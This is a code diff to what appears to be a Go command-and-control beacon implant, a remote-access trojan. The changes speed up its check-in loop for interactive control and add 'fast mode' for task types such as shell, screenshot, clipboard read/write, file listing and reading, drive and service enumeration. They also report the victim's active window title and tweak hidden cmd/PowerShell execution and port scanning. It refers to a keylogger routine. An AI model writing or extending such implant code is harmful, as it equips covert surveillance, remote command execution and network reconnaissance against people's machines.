@@ -295,11 +295,24 @@ func main() {
 	// Main beacon loop
 	for {
 		doBeacon()
+		// Deliver task results immediately instead of waiting a full sleep cycle.
+		if len(pendingResults) > 0 {
+			continue
+		}
 		sleepWithJitter()
 	}
 }
 
 func sleepWithJitter() {
+	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
+	if Interval <= 0 {
+		d := 200 * time.Millisecond
+		if inFastMode {
+			d = 50 * time.Millisecond
+		}
+		time.Sleep(d)
+		return
+	}
 	baseInterval := Interval
 	if inFastMode {
 		baseInterval = FastInterval
@@ -318,8 +331,13 @@ func sleepWithJitter() {
 
 func checkFastMode(tasks []Task) {
 	inFastMode = false
+	fastTypes := map[string]bool{
+		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
+		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
+		"services": true, "beacon_now": true, "ls": true, "read": true,
+	}
 	for _, task := range tasks {
-		if task.Type == "screenshot" {
+		if fastTypes[task.Type] {
 			inFastMode = true
 			return
 		}
@@ -694,8 +712,9 @@ func getSystemInfo() map[string]string {
 		"integrity":   integrity,
 		"elevated":    strconv.FormatBool(elevated),
 		"domain":      domain,
-		"interval":    strconv.Itoa(Interval),
-		"jitter":      strconv.Itoa(Jitter),
+		"interval":      strconv.Itoa(Interval),
+		"jitter":        strconv.Itoa(Jitter),
+		"active_window": getActiveWindowTitle(),
 	}
 	return info
 }
@@ -739,10 +758,13 @@ func executeTask(task Task) TaskResult {
 func runShell(cmdStr, shell string) (string, error) {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
-		if shell == "powershell.exe" || strings.Contains(cmdStr, "powershell") {
+		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
+			if !strings.Contains(cmdStr, "OutputEncoding") {
+				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
+			}
 			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
 		} else {
-			cmd = exec.Command("cmd.exe", "/C", cmdStr)
+			cmd = exec.Command("cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
 		}
 		applyHideWindow(cmd)
 	} else {
@@ -758,7 +780,7 @@ func runShell(cmdStr, shell string) (string, error) {
 	cmd.Stdout = &out
 	cmd.Stderr = &out
 	err := cmd.Run()
-	return out.String(), err
+	return decodeShellOutput(out.Bytes(), shell), err
 }
 
 // setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
@@ -1039,10 +1061,10 @@ func portScan(target string) (string, error) {
 	var results []string
 	for _, ip := range ips {
 		for _, port := range ports {
-			addr := fmt.Sprintf("%s:%s", strings.TrimSpace(ip), strings.TrimSpace(port))
-			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
-			if err == nil {
-				results = append(results, addr+" open")
+		addr := net.JoinHostPort(strings.TrimSpace(ip), strings.TrimSpace(port))
+		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
+		if err == nil {
+			results = append(results, addr+" open")
 				conn.Close()
 			} else {
 				results = append(results, addr+" closed")
